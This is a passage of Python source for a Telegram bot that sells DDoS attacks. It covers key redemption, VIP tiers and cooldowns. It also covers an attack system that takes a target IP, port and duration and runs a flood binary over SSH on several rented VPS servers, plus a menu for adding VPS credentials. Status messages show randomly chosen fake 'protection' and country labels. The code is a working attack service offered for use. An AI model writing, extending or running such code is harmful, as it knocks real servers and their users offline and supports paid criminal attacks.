        del vip_keys[key]
        deleted_from.append("VIP")
    if key in redeemed_keys_info:
        del redeemed_keys_info[key]
        deleted_from.append("REDEEMED")
    
    save_data()
    
    bot.edit_message_text(
        f"╭━━━〔 ✅ 𝗞𝗘𝗬 𝗗𝗘𝗟𝗘𝗧𝗘𝗗 〕━━━╮\n"
        f"│\n"
        f"│ 🔑 Key: `{key}`\n"
        f"│ 🗑 Removed from: {', '.join(deleted_from)}\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown"
    )
    bot.answer_callback_query(call.id, "Key deleted successfully")

@bot.callback_query_handler(func=lambda call: call.data == 'cancel_delete')
def cancel_deletion(call):
    """Cancel key deletion"""
    bot.edit_message_text(
        "╭━━━〔 🚫 𝗖𝗔𝗡𝗖𝗘𝗟𝗘𝗗 〕━━━╮\n"
        "│\n"
        "│ Key deletion cancelled\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        call.message.chat.id,
        call.message.message_id
    )
    bot.answer_callback_query(call.id, "Deletion cancelled")

@bot.message_handler(func=lambda msg: msg.text == "⏳ CHECK EXPIRY")
def check_key_expiry(message):
    """Check remaining time for a key"""
    if not is_admin(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only admins can check expiry!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    bot.reply_to(message,
        "╭━━━〔 ⏳ 𝗖𝗛𝗘𝗖𝗞 𝗘𝗫𝗣𝗜𝗥𝗬 〕━━━╮\n"
        "│\n"
        "│ Enter the key to check:\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    bot.register_next_step_handler(message, process_expiry_check)

def process_expiry_check(message):
    """Process key expiry check"""
    key = message.text.strip().upper()
    details = None
    key_type = ""
    
    if key in keys:
        details = keys[key]
        key_type = "STANDARD"
    elif key in vip_keys:
        details = vip_keys[key]
        key_type = "VIP"
    elif key in redeemed_keys_info:
        details = redeemed_keys_info[key]
        key_type = "REDEEMED"
    else:
        bot.reply_to(message,
            "╭━━━〔 ❌ 𝗞𝗘𝗬 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗 〕━━━╮\n"
            "│\n"
            "│ This key doesn't exist in:\n"
            "│ • Active keys\n"
            "│ • VIP keys\n"
            "│ • Redeemed keys\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    remaining = details['expiration_time'] - time.time()
    if remaining <= 0:
        time_left = "❌ EXPIRED"
    else:
        days = int(remaining // 86400)
        hours = int((remaining % 86400) // 3600)
        minutes = int((remaining % 3600) // 60)
        time_left = f"{days}d {hours}h {minutes}m"
    
    expiry_date = datetime.datetime.fromtimestamp(details['expiration_time']).strftime('%Y-%m-%d %H:%M')
    
    bot.reply_to(message,
        f"╭━━━〔 ⏳ 𝗞𝗘𝗬 𝗦𝗧𝗔𝗧𝗨𝗦 〕━━━╮\n"
        f"│\n"
        f"│ 🔑 Key: `{key}`\n"
        f"│ 🏷 Type: {key_type}\n"
        f"│ ⏱ Remaining: {time_left}\n"
        f"│ 📅 Expires at: {expiry_date}\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        parse_mode="Markdown")    

@bot.message_handler(func=lambda msg: msg.text == "🔑 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔")
def redeem_key_start(message):
    """Start key redemption process with premium styling"""
    if not is_allowed_group(message):
        bot.reply_to(message, "❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗴𝗿𝗼𝘂𝗽!")
        return
    
    bot.reply_to(message, "⚠️ 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗸𝗲𝘆 𝘁𝗼 𝗿𝗲𝗱𝗲𝗲𝗺.", parse_mode="Markdown")
    bot.register_next_step_handler(message, redeem_key_input)
    
def redeem_key_input(message):
    """Process key redemption with premium styling"""
    key = message.text.strip()
    user_id = str(message.from_user.id)
    user = message.from_user
    
    # Check normal keys
    if key in keys:
        expiry_time = keys[key]['expiration_time']
        if time.time() > expiry_time:
            bot.reply_to(message, "❌ 𝗞𝗲𝘆 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱!")
            return
            
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': keys[key]['generated_by'],
            'expiration_time': expiry_time,
            'is_vip': False
        }
        
        redeemed_users[user_id] = {
            'expiration_time': expiry_time,
            'key': key
        }
        
        del keys[key]
        
    # Check VIP keys
    elif key in vip_keys:
        expiry_time = vip_keys[key]['expiration_time']
        if time.time() > expiry_time:
            bot.reply_to(message, "❌ 𝗩𝗜𝗣 𝗸𝗲𝘆 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱!")
            return
            
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': vip_keys[key]['generated_by'],
            'expiration_time': expiry_time,
            'is_vip': True
        }
        
        redeemed_users[user_id] = {
            'expiration_time': expiry_time,
            'key': key,
            'is_vip': True
        }
        
        del vip_keys[key]
        
    else:
        bot.reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗸𝗲𝘆! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗵𝗲𝗰𝗸 𝗮𝗻𝗱 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
        return
    
    save_data()
    
    remaining_time = expiry_time - time.time()
    hours = int(remaining_time // 3600)
    minutes = int((remaining_time % 3600) // 60)
    
    if redeemed_users[user_id].get('is_vip'):
        response = f"""
🌟 𝗩𝗜𝗣 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!

🔑 𝗞𝗲𝘆: `{key}`
⏳ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {hours}𝗵 {minutes}𝗺

🔥 𝗩𝗜𝗣 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘𝗦:
• Max Duration: {VIP_MAX_DURATION}𝘀
• Max Threads: {VIP_MAX_THREADS}
• Priority Queue Access
• No Cooldowns
"""
    else:
        response = f"""
✅ 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!

🔑 𝗞𝗲𝘆: `{key}`
⏳ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {hours}𝗵 {minutes}𝗺
"""
    
    bot.reply_to(message, response, parse_mode="Markdown")
    
    # Notify owner
    if not is_admin(user):
        try:
            bot.send_message(
                ADMIN_IDS[0], 
                f"🔑 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗\n\n"
                f"• 𝗨𝘀𝗲𝗿: @{user.username if user.username else user.first_name}\n"
                f"• 𝗞𝗲𝘆: `{key}`\n"
                f"• 𝗧𝘆𝗽𝗲: {'VIP' if redeemed_users[user_id].get('is_vip') else 'Normal'}"
            )
        except:
            pass



# ======================
# 🚀 ATTACK SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text in ["🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃", "🔥 𝙑𝙄𝙋 𝘼𝙏𝙏𝘼𝘾𝙆"])
def attack_start(message):
    """Start attack process with key expiration check"""
    # New expiration check
    user_id = str(message.from_user.id)
    if user_id in redeemed_users and isinstance(redeemed_users[user_id], dict):
        if redeemed_users[user_id]['expiration_time'] <= time.time():
            bot.reply_to(message, 
                "❌ 𝗬𝗼𝘂𝗿 𝗸𝗲𝘆 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱!\n"
                "𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗱𝗲𝗲𝗺 𝗮 𝗻𝗲𝘄 𝗸𝗲𝘆 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲."
            )
            return

    # Rest of original function remains unchanged
    is_public = message.chat.id in PUBLIC_GROUPS and not is_authorized_user(message.from_user)
    
    if is_public:
        response = f"""
╭━━━〔 🌐 𝗣𝗨𝗕𝗟𝗜𝗖 𝗔𝗧𝗧𝗔𝗖𝗞 𝗠𝗢𝗗𝗘 〕━━━╮
│
│ 𝗘𝗻𝘁𝗲𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝗲𝘁𝗮𝗶𝗹𝘀 𝗶𝗻 𝗳𝗼𝗿𝗺𝗮𝘁:
│ 
│ <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>
│
│ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:
│ ⏱ 𝗠𝗮𝘅 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: 𝟭𝟮𝟬𝘀
│ 🧵 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: 𝟭𝟴𝟬𝟬 (𝗳𝗶𝘅𝗲𝗱)
│
│ 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: 20.235.90.0 24401 120
│ 
│   KYA GUNDA BANEGA RE 😂
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_public_attack_args)
        return
    
    # Original authorization check
    if not is_authorized_user(message.from_user):
        bot.reply_to(message, "❌ 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗸𝗲𝘆 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁 𝗮𝗻 𝗮𝘁𝘁𝗮𝗰𝗸!")
        return
    
    # Rest of original function continues...
    
    global last_attack_time
    current_time = time.time()
    user_id = str(message.from_user.id)
    
    # Check cooldown (skip for VIP)
    is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
    if not is_vip and current_time - last_attack_time < global_cooldown:
        remaining = int(global_cooldown - (current_time - last_attack_time))
        bot.reply_to(message, f"⌛ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁! 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗮𝗰𝘁𝗶𝘃𝗲. 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining}𝘀")
        return
    
    # Determine max duration based on user type
    max_duration = VIP_MAX_DURATION if is_vip else MAX_DURATION
    max_threads = VIP_MAX_THREADS if is_vip else SPECIAL_MAX_THREADS if user_id in special_keys else MAX_THREADS
    
    response = f"""
╭━━━〔 {'🔥 𝗩𝗜𝗣' if is_vip else '⚡ 𝗦𝗣𝗘𝗖𝗜𝗔𝗟' if user_id in special_keys else '🚀 𝗡𝗢𝗥𝗠𝗔𝗟'} 𝗔𝗧𝗧𝗔𝗖𝗞 〕━━━╮
│
│ 𝗘𝗻𝘁𝗲𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝗲𝘁𝗮𝗶𝗹𝘀 𝗶𝗻 𝗳𝗼𝗿𝗺𝗮𝘁:
│ 
│ <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>
│
│ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗟𝗲𝘃𝗲𝗹:
│ ⏱ 𝗠𝗮𝘅 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {max_duration}𝘀
│ 🧵 𝗠𝗮𝘅 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {max_threads}0
│
│ 𝗘𝘅𝗮𝗺𝗽𝗹𝗲𝘀: 20.235.90.0 24401 120
│      
│   KYA GUNDA BANEGA RE 😂
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
    bot.reply_to(message, response)
    bot.register_next_step_handler(message, process_attack_args)

def process_public_attack_args(message):
    """Process attack arguments for public mode with strict limits"""
    try:
        args = message.text.split()
        if len(args) != 3:
            raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁! 𝗨𝘀𝗲: <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
            
        ip, port, duration = args
        threads = 900  # Fixed thread count for public attacks
        
        # Validate and enforce limits
        try:
            ipaddress.ip_address(ip)
            port = int(port)
            duration = int(duration)
            
            if not 1 <= port <= 65535:
                raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 (𝟭-𝟲𝟱𝟱𝟯𝟱)")
            
            # Enforce public attack limits strictly
            if duration > 120:
                raise ValueError("❌ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝟭𝟮𝟬𝘀 𝗳𝗼𝗿 𝗽𝘂𝗯𝗹𝗶𝗰 𝗮𝘁𝘁𝗮𝗰𝗸𝘀")
                
            # Start attack with public limitations
            start_attack(message, ip, port, duration, threads, is_public=True)
            
        except ValueError as e:
            raise ValueError(str(e))
            
    except Exception as e:
        bot.reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

def process_attack_args(message):
    """Process attack arguments with strict enforcement of VIP/normal limits"""
    try:
        args = message.text.split()
        if len(args) != 3:
            raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁! 𝗨𝘀𝗲: <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
            
        ip, port, duration = args
        
        # Validate and enforce limits
        try:
            ipaddress.ip_address(ip)
            port = int(port)
            duration = int(duration)
            
            if not 1 <= port <= 65535:
                raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 (𝟭-𝟲𝟱𝟱𝟯𝟱)")
            
            user_id = str(message.from_user.id)
            is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
            is_special = user_id in special_keys
            
            # Determine thread count based on user type
            if is_vip:
                threads = VIP_MAX_THREADS
                max_duration = VIP_MAX_DURATION
            elif is_special:
                threads = SPECIAL_MAX_THREADS
                max_duration = SPECIAL_MAX_DURATION
            else:
                threads = MAX_THREADS
                max_duration = MAX_DURATION
            
            if duration > max_duration:
                raise ValueError(f"❌ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 {max_duration}𝘀 {'(𝗩𝗜𝗣)' if is_vip else '(𝗦𝗽𝗲𝗰𝗶𝗮𝗹)' if is_special else ''}")
                
            # Start attack
            start_attack(message, ip, port, duration, threads)
            
        except ValueError as e:
            raise ValueError(str(e))
            
    except Exception as e:
        bot.reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

def execute_attack(vps, ip, port, duration, threads):
    """Execute attack command on a VPS with proper timeout"""
    ssh = None
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps[0], username=vps[1], password=vps[2], timeout=15)
        
        # Use timeout command to ensure attack stops after duration
        cmd = f"timeout {duration} {BINARY_PATH} {ip} {port} {duration} {threads}"
        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=10)
        exit_status = stdout.channel.recv_exit_status()
        
        # Timeout exits with status 124 - that's expected
        if exit_status not in [0, 124]:
            raise Exception(f"Attack failed with exit code {exit_status}")
        return True
    except Exception as e:
        raise Exception(f"Attack execution failed: {str(e)}")
    finally:
        if ssh:
            ssh.close()

def run_ssh_attack(vps, ip, port, duration, threads, attack_id, attack_num, chat_id, user_id, is_vip, msg_id, country, flag, protection, is_public=False):
    attack_id_vps = f"{attack_id}-{attack_num}"
    running_attacks[attack_id_vps] = {
        'user_id': user_id,
        'target_ip': ip,
        'start_time': time.time(),
        'duration': duration,
        'is_vip': is_vip,
        'vps_ip': vps[0],
        'is_public': is_public,
        'threads': threads,
        'completed': False,
        'message_sent': False  # Track if completion message was sent
    }
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps[0], username=vps[1], password=vps[2], timeout=15)
        
        cmd = f"timeout {duration} {BINARY_PATH} {ip} {port} {duration} {threads} &"
        ssh.exec_command(cmd)
        
        start_time = time.time()
        last_update = 0
        
        while True:
            current_time = time.time()
            elapsed = current_time - start_time
            progress = min(100, int((elapsed / duration) * 100))
            
            if current_time - last_update >= 1:
                update_attack_status(chat_id, msg_id, ip, port, duration, threads, progress, country, flag, protection, is_vip, is_public)
                last_update = current_time
            
            if elapsed >= duration:
                break
                
            time.sleep(0.1)
        
        update_attack_status(chat_id, msg_id, ip, port, duration, threads, 100, country, flag, protection, is_vip, is_public)
        
        # Mark this attack as completed
        running_attacks[attack_id_vps]['completed'] = True
        
        # Check if we should send completion message
        target_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
        all_completed = all(running_attacks[aid]['completed'] for aid in target_attacks)
        
        if all_completed and not running_attacks[attack_id_vps]['message_sent']:
            # Mark all as having message sent to prevent duplicates
            for aid in target_attacks:
                running_attacks[aid]['message_sent'] = True
            
            attack_type = "🌐 PUBLIC" if is_public else "🔥 VIP" if is_vip else "⚡ SPECIAL"
            completion_msg = f"""
╭━━━〔 {attack_type} ATTACK COMPLETED 〕━━━╮
│
│ 🎯 Target: {ip}:{port}
│ ⏱ Duration: {duration}s
│ 🧵 Threads: {threads}0
│
│ {flag} {country}
│ 🛡️ Protection: {protection}
│
│ ✅ All attacks finished successfully!
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
            bot.send_message(chat_id, completion_msg)
            
    except Exception as e:
        error_msg = f"❌ ATTACK ERROR ({vps[0]})\n\n{flag} {country} | 🛡️ {protection}\nError: {str(e)}\n\n🎯 Target: {ip}:{port}\n⚠️ Attack interrupted"
        bot.send_message(chat_id, error_msg)
    finally:
        try:
            ssh.close()
        except:
            pass
        
        # Clean up if all attacks are done
        target_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
        if all(running_attacks[aid].get('message_sent', False) for aid in target_attacks):
            for aid in target_attacks:
                running_attacks.pop(aid, None)

def update_attack_status(chat_id, msg_id, ip, port, duration, threads, progress, country, flag, protection, is_vip, is_public):
    attack_type = "🌐 PUBLIC" if is_public else "🔥 VIP" if is_vip else "⚡ SPECIAL"
    progress_bar = create_progress_bar(progress)
    elapsed_time = int(duration * (progress/100))
    remaining_time = max(0, duration - elapsed_time)
    
    status_msg = f"""
╭━━━〔 {attack_type} ATTACK 〕━━━╮
│
│ 🎯 Target: {ip}:{port}
│ ⏱ Duration: {duration}s (Elapsed: {elapsed_time}s)
│ 🧵 Threads: {threads}0
│
│ {flag} {country}
│ 🛡️ Protection: {protection}
│
│ {progress_bar}
│ {'⚡ Running' if progress < 100 else '✅ Completing...'}
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
    try:
        bot.edit_message_text(status_msg, chat_id, msg_id)
    except:
        pass

def start_attack(message, ip, port, duration, threads, is_public=False):
    user_id = str(message.from_user.id)
    is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
    
    vps_distribution = select_optimal_vps(VPS_LIST, threads)
    if not vps_distribution:
        bot.reply_to(message, "❌ No servers available! Try again later.")
        return
    
    attack_id = f"{ip}:{port}-{time.time()}"
    country, flag = random.choice([
        ("United States", "🇺🇸"), ("Germany", "🇩🇪"), ("Japan", "🇯🇵"),
        ("Singapore", "🇸🇬"), ("Netherlands", "🇳🇱"), ("France", "🇫🇷")
    ])
    
    protection = random.choice([
        "Cloudflare Enterprise", "AWS Shield", "Google Armor",
        "Imperva Defense", "Akamai Prolexic", "Azure Protection"
    ])
    
    attack_type = "🌐 PUBLIC" if is_public else "🔥 VIP" if is_vip else "⚡ SPECIAL"
    msg_text = f"""
╭━━━〔 {attack_type} ATTACK 〕━━━╮
│
│ 🎯 Target: {ip}:{port}
│ ⏱ Duration: {duration}s
│ 🧵 Threads: {threads}
│
│ {flag} {country}
│ 🛡️ Protection: {protection}
│
│ {create_progress_bar(0)}
│ 🔄 Initializing attack...
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
    msg = bot.send_message(message.chat.id, msg_text)
    
    for i, (vps, vps_threads) in enumerate(vps_distribution):
        if vps_threads > 0:
            threading.Thread(
                target=run_ssh_attack,
                args=(vps, ip, port, duration, vps_threads, attack_id, i, 
                      message.chat.id, user_id, is_vip, msg.message_id, 
                      country, flag, protection, is_public),
                daemon=True
            ).start()
    
    global last_attack_time
    last_attack_time = time.time()

# ======================
# 🖥️ VPS MANAGEMENT (PREMIUM STYLISH VERSION)
# ======================

@bot.message_handler(func=lambda msg: msg.text == "🖥️ 𝙑𝙋𝙎 𝙈𝘼𝙉𝘼𝙂𝙀𝙍")
def vps_management_menu(message):
    """Handle VPS management menu with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only owner can access VPS manager!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    bot.send_message(
        message.chat.id,
        "╭━━━〔 🖥️ 𝗩𝗣𝗦 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧 〕━━━╮\n"
        "│\n"
        "│ Total VPS: {}\n"
        "│ Active VPS: {}\n"
        "│ Binary: {}\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯".format(
            len(VPS_LIST),
            ACTIVE_VPS_COUNT,
            BINARY_NAME
        ),
        reply_markup=create_vps_management_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "🖥️ 𝙑𝙋𝙎 𝙎𝙏𝘼𝙏𝙐𝙎")
def show_vps_status(message):
    """Show detailed VPS status with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only owner can check VPS status!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    if not VPS_LIST:
        bot.reply_to(message, 
            "╭━━━〔 ⚠️ 𝗡𝗢 𝗩𝗣𝗦 〕━━━╮\n"
            "│\n"
            "│ No VPS configured in system!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    # Send initial processing message
    msg = bot.send_message(message.chat.id, 
        "╭━━━〔 🔍 𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚 𝗩𝗣𝗦 〕━━━╮\n"
        "│\n"
        "│ Checking all server status...\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    
    # Create loading animation
    for i in range(3):
        try:
            dots = "." * (i + 1)
            bot.edit_message_text(
                f"╭━━━〔 🔍 𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚 𝗩𝗣𝗦 〕━━━╯\n"
                f"│\n"
                f"│ Checking all server status{dots}\n"
                f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
                message.chat.id,
                msg.message_id
            )
            time.sleep(0.5)
        except:
            pass
    
    status_messages = []
    online_count = 0
    offline_count = 0
    busy_count = 0
    
    # Get list of busy VPS (running attacks)
    busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    
    for i, vps in enumerate(VPS_LIST):
        if len(vps) < 3:  # Skip invalid VPS configurations
            continue
            
        ip, username, password = vps[0], vps[1], vps[2]
        
        try:
            # Get detailed health stats
            health = check_vps_health(ip, username, password)
            
            # Determine status emoji
            if ip in busy_vps:
                status_emoji = "🟡"
                status_text = "BUSY (Running Attack)"
                busy_count += 1
            elif health['health_percent'] > 70:
                status_emoji = "🟢"
                status_text = "ONLINE"
                online_count += 1
            elif health['health_percent'] > 30:
                status_emoji = "🟠"
                status_text = "WARNING"
                online_count += 1
            else:
                status_emoji = "🔴"
                status_text = "CRITICAL"
                offline_count += 1
            
            # Create health bar
            health_bar = create_progress_bar(health['health_percent'])
            
            # Format the status message
            status_msg = f"""
🔹 𝗩𝗣𝗦 #{i+1} - {ip}
{status_emoji} 𝗦𝘁𝗮𝘁𝘂𝘀: {status_text}
├ 𝗛𝗲𝗮𝗹𝘁𝗵: {health_bar}
├ 𝗖𝗣𝗨 𝗟𝗼𝗮𝗱: {health['cpu']}
├ 𝗠𝗲𝗺𝗼𝗿𝘆 𝗨𝘀𝗮𝗴𝗲: {health['memory']}
├ 𝗗𝗶𝘀𝗸 𝗨𝘀𝗮𝗴𝗲: {health['disk']}
├ 𝗡𝗲𝘁𝘄𝗼𝗿𝗸: {'✅' if health['network'] else '❌'}
└ 𝗕𝗶𝗻𝗮𝗿𝘆: {'✅' if health['binary_exists'] else '❌'} {'(Executable)' if health['binary_executable'] else ''}
"""
            status_messages.append(status_msg)
            
        except Exception as e:
            status_msg = f"""
🔹 𝗩𝗣𝗦 #{i+1} - {ip}
🔴 𝗦𝘁𝗮𝘁𝘂𝘀: OFFLINE/ERROR
└ 𝗘𝗿𝗿𝗼𝗿: {str(e)[:50]}...
"""
            status_messages.append(status_msg)
            offline_count += 1
    
    # Create summary
    summary = f"""
📊 𝗩𝗣𝗦 𝗦𝘁𝗮𝘁𝘂𝘀 𝗦𝘂𝗺𝗺𝗮𝗿𝘆
🟢 𝗢𝗻𝗹𝗶𝗻𝗲: {online_count}
🟡 𝗕𝘂𝘀𝘆: {busy_count}
🔴 𝗢𝗳𝗳𝗹𝗶𝗻𝗲: {offline_count}
📡 𝗧𝗼𝘁𝗮𝗹 𝗩𝗣𝗦: {len(VPS_LIST)}
⏱ 𝗟𝗮𝘀𝘁 𝗖𝗵𝗲𝗰𝗸: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    
    full_message = summary + "\n" + "\n".join(status_messages)
    
    try:
        # Try to edit the original message
        bot.edit_message_text(
            full_message, 
            message.chat.id, 
            msg.message_id,
            parse_mode="Markdown"
        )
    except:
        # If message is too long or edit fails, send as new messages
        if len(full_message) > 4000:
            # Split into parts
            parts = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]
            for part in parts:
                bot.send_message(
                    message.chat.id, 
                    part,
                    parse_mode="Markdown"
                )
        else:
            bot.send_message(
                message.chat.id, 
                full_message,
                parse_mode="Markdown"
            )

@bot.message_handler(func=lambda msg: msg.text == "➕ 𝘼𝘿𝘿 𝙑𝙋𝙎")
def add_vps_start(message):
    """Start VPS addition process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only owner can add VPS!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    bot.reply_to(message,
        "╭━━━〔 ➕ 𝗔𝗗𝗗 𝗩𝗣𝗦 〕━━━╮\n"
        "│\n"
        "│ Enter VPS details in format:\n"
        "│ <ip> <username> <password>\n"
        "│\n"
        "│ Example:\n"
        "│ 1.1.1.1 root password123\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    bot.register_next_step_handler(message, add_vps_process)

def add_vps_process(message):
    """Process VPS addition with premium styling"""
    try:
        args = message.text.split()
        if len(args) != 3:
            raise ValueError("Invalid format! Use: <ip> <username> <password>")
            
        ip, username, password = args

        # Validate IP address
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            raise ValueError("Invalid IP address format")

        # Try SSH connection before saving
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            # Check binary existence
            stdin, stdout, stderr = ssh.exec_command(f"test -x {BINARY_PATH} && echo 'exists' || echo 'missing'")
            binary_status = stdout.read().decode().strip()
            
            VPS_LIST.append([ip, username, password])
            save_data()

            response = f"""
╭━━━〔 ✅ 𝗩𝗣𝗦 𝗔𝗗𝗗𝗘𝗗 〕━━━╮
│
│ 𝗜𝗣: `{ip}`
│ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: `{username}`
│ 𝗕𝗶𝗻𝗮𝗿𝘆: {'✅ Found' if binary_status == 'exists' else '❌ Missing'}
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
            bot.reply_to(message, response, parse_mode="Markdown")

        finally:
            ssh.close()

